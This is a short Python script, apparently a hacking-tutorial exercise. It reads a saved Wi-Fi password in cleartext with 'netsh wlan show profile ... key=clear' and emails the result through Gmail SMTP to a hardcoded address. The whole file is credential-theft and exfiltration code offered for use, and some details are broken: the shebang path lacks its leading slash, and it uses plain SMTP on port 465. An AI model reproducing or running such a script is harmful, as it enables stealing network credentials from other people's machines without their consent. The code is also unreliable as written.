#!usr/bin/env python3

import subprocess, smtplib


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 465)
    server.ehlo()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


command = "netsh wlan show profile MYWIFI key=clear"
result = subprocess.check_output(command, shell=True)
send_mail("myemail@myemail.com", "mypassword", result)
